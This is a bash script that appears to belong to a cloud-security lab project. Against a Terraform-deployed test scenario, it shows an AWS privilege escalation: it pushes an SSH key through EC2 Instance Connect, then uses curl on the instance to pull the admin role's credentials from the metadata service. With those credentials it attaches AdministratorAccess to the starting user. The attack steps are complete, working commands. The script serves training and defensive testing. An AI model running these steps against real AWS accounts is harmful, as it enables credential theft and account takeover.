#!/bin/bash

# Demo script for ec2-instance-connect:SendSSHPublicKey privilege escalation
# This scenario demonstrates how a user with ec2-instance-connect:SendSSHPublicKey
# can SSH into an EC2 instance and extract admin role credentials via IMDS

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-ec2-003-to-admin-starting-user"
EC2_ADMIN_ROLE="pl-prod-ec2-003-to-admin-ec2-admin-role"
SSH_KEY_PATH="/tmp/pathfinding_eic_key"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}EC2 Instance Connect Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ec2_003_ec2_instance_connect_sendsshpublickey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
EC2_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_admin_role_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract instance ID from terraform output${NC}"
    echo "The EC2 instance may not be ready yet. Wait a few minutes and try again."
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_NAME"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Target Instance: $INSTANCE_ID"
echo "Target Role: $EC2_ROLE_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
# Save credentials for later use
ACCESS_KEY=$STARTING_ACCESS_KEY_ID
SECRET_KEY=$STARTING_SECRET_ACCESS_KEY

export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Discover target EC2 instance
echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
echo "Getting instance details..."
INSTANCE_INFO=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn,Platform]' \
    --output text 2>/dev/null || echo "")

if [ -n "$INSTANCE_INFO" ]; then
    INSTANCE_STATE=$(echo $INSTANCE_INFO | awk '{print $2}')
    PUBLIC_IP=$(echo $INSTANCE_INFO | awk '{print $3}')
    INSTANCE_PROFILE=$(echo $INSTANCE_INFO | awk '{print $4}')
    PLATFORM=$(echo $INSTANCE_INFO | awk '{print $5}')

    echo "Instance ID: $INSTANCE_ID"
    echo "State: $INSTANCE_STATE"
    echo "Public IP: $PUBLIC_IP"
    echo "Instance Profile: $INSTANCE_PROFILE"
    echo "Platform: ${PLATFORM:-Linux}"

    if [ "$INSTANCE_STATE" != "running" ]; then
        echo -e "${RED}Error: Instance is not in running state${NC}"
        exit 1
    fi

    if [ -z "$PUBLIC_IP" ] || [ "$PUBLIC_IP" = "None" ]; then
        echo -e "${RED}Error: Instance does not have a public IP address${NC}"
        exit 1
    fi

    echo -e "${GREEN}✓ Found target instance with privileged role${NC}"
else
    echo -e "${RED}Error: Could not describe instance${NC}"
    exit 1
fi
echo ""

# Step 6: Generate SSH key pair
echo -e "${YELLOW}Step 6: Generating temporary SSH key pair${NC}"
echo "Creating RSA key pair for EC2 Instance Connect..."

# Remove old keys if they exist
rm -f ${SSH_KEY_PATH} ${SSH_KEY_PATH}.pub

# Generate new key pair
ssh-keygen -t rsa -f ${SSH_KEY_PATH} -N "" -C "pathfinding-eic-demo" > /dev/null 2>&1

if [ ! -f "${SSH_KEY_PATH}.pub" ]; then
    echo -e "${RED}Error: Failed to generate SSH key pair${NC}"
    exit 1
fi

SSH_PUBLIC_KEY=$(cat ${SSH_KEY_PATH}.pub)
echo "Generated SSH public key"
echo -e "${GREEN}✓ SSH key pair created at: ${SSH_KEY_PATH}${NC}\n"

# Step 7: Push public key to instance using EC2 Instance Connect
echo -e "${YELLOW}Step 7: Pushing SSH public key to instance (privilege escalation vector)${NC}"
echo "Using ec2-instance-connect:SendSSHPublicKey to push temporary key..."
echo ""
echo -e "${BLUE}This is where the privilege escalation happens:${NC}"
echo "We can push our SSH public key to the instance for 60 seconds!"

# Default username for Amazon Linux 2023
EC2_USER="ec2-user"

# Attempt to send SSH public key
aws ec2-instance-connect send-ssh-public-key \
    --region $AWS_REGION \
    --instance-id $INSTANCE_ID \
    --instance-os-user $EC2_USER \
    --ssh-public-key file://${SSH_KEY_PATH}.pub

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to push SSH public key to instance${NC}"
    echo "This could be due to:"
    echo "  - EC2 Instance Connect not enabled in the region"
    echo "  - Wrong OS user (tried: $EC2_USER)"
    echo "  - Instance not ready"
    exit 1
fi

echo ""
echo -e "${GREEN}✓ Successfully pushed SSH public key to instance!${NC}"
echo -e "${RED}⚠ WARNING: The public key is only valid for 60 seconds!${NC}"
echo ""

# Step 8: SSH into the instance and extract credentials non-interactively
echo -e "${YELLOW}Step 8: SSH into the instance and extract credentials (automated)${NC}"
echo ""
echo -e "${RED}⏰ IMPORTANT: We have 60 seconds to SSH and extract credentials!${NC}"
echo ""

# Build the SSH command to execute remotely
SSH_COMMAND='TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'

echo "Executing SSH command to extract credentials from IMDS..."
CREDS_JSON=$(ssh -i ${SSH_KEY_PATH} -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${EC2_USER}@${PUBLIC_IP} "${SSH_COMMAND}" 2>/dev/null)

if [ $? -ne 0 ] || [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Failed to SSH into instance or extract credentials${NC}"
    echo "This could be due to:"
    echo "  - SSH connection timeout (60 second key expiration)"
    echo "  - Instance not ready for SSH"
    echo "  - Network connectivity issues"
    echo ""
    echo "Trying again with verbose output..."
    ssh -v -i ${SSH_KEY_PATH} -o StrictHostKeyChecking=no ${EC2_USER}@${PUBLIC_IP} "${SSH_COMMAND}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials via SSH${NC}\n"

# Step 9: Parse and export extracted credentials
echo -e "${YELLOW}Step 9: Parsing and configuring extracted credentials${NC}"

EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId')
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey')
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token')

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ "$EXTRACTED_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Failed to parse credentials from JSON${NC}"
    echo "Received output:"
    echo "$CREDS_JSON"
    exit 1
fi

echo "Extracted Access Key ID: ${EXTRACTED_ACCESS_KEY:0:10}..."
echo "Switching to extracted credentials..."

export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION="$AWS_REGION"

# Verify new identity
NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $NEW_IDENTITY"
echo -e "${GREEN}✓ Now using extracted EC2 admin role credentials${NC}\n"

# Step 10: Use admin credentials to grant admin access to starting user
echo -e "${YELLOW}Step 10: Using admin credentials to make starting user an admin${NC}"
echo "Attaching AdministratorAccess policy to starting user: $STARTING_USER_NAME"
echo ""

aws iam attach-user-policy \
    --user-name "$STARTING_USER_NAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully attached AdministratorAccess policy to starting user!${NC}"
else
    echo -e "${RED}Failed to attach admin policy${NC}"
    exit 1
fi

echo ""
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

# Step 11: Switch back to starting user and verify admin access
echo ""
echo -e "${YELLOW}Step 11: Switching back to starting user and verifying admin access${NC}"
echo "Switching from extracted credentials back to starting user..."

export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
unset AWS_SESSION_TOKEN
export AWS_REGION="$AWS_REGION"

# Verify we're back to starting user
STARTING_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Back to starting user: $STARTING_IDENTITY"
echo ""

echo "Testing admin access as starting user..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ STARTING USER NOW HAS ADMIN ACCESS!${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with ec2-instance-connect:SendSSHPublicKey permission)"
echo "2. Pushed temporary SSH public key to EC2 instance: $INSTANCE_ID"
echo "3. SSH'd into the instance within 60-second window"
echo "4. Extracted instance role credentials from IMDS (metadata service)"
echo "5. Used credentials from: $EC2_ADMIN_ROLE"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (ec2-instance-connect:SendSSHPublicKey) → SSH to EC2"
echo -e "  → (Extract from IMDS) → $EC2_ADMIN_ROLE → Admin"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SSH key pair: ${SSH_KEY_PATH} (temporary)"
echo "- Accessed instance: $INSTANCE_ID"
echo "- Extracted role: $EC2_ADMIN_ROLE"

echo -e "\n${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "- T1078.004: Valid Accounts: Cloud Accounts (EC2 Instance Connect)"
echo "- T1552.005: Unsecured Credentials: Cloud Instance Metadata API"

echo -e "\n${RED}⚠ Security Impact:${NC}"
echo "Any principal with ec2-instance-connect:SendSSHPublicKey on an instance"
echo "can SSH into that instance and extract the instance role's credentials."
echo "If the instance has a privileged role, this results in privilege escalation."

echo -e "\n${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
